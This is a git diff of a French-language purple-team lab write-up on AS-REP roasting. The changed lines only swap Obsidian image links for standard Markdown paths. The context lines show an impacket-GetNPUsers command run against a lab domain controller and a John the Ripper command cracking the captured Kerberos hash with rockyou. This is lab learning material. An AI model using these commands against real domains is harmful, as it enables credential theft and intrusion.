@@ -54,7 +54,7 @@ Lancer GetNPUsers :
 impacket-GetNPUsers lab.local/ -usersfile ~/lab_purple_team/users.txt -dc-ip 192.168.10.100 -no-pass
 ```
 
-![[asrep_hash_capture.png]]
+![](../../screenshots/asrep_hash_capture.png)
 
 `svc-backup` est vulnérable, le hash AS-REP est retourné.
 
@@ -69,7 +69,7 @@ john ~/lab_purple_team/svc-backup_hash.txt --wordlist=/usr/share/wordlists/rocky
 | `--format=krb5asrep` | Format AS-REP Kerberos etype 23 |
 | `--wordlist` | Dictionnaire rockyou |
 
-![[asrep_cracked.png]]
+![](../../screenshots/asrep_cracked.png)
 
 ### Résultat
 
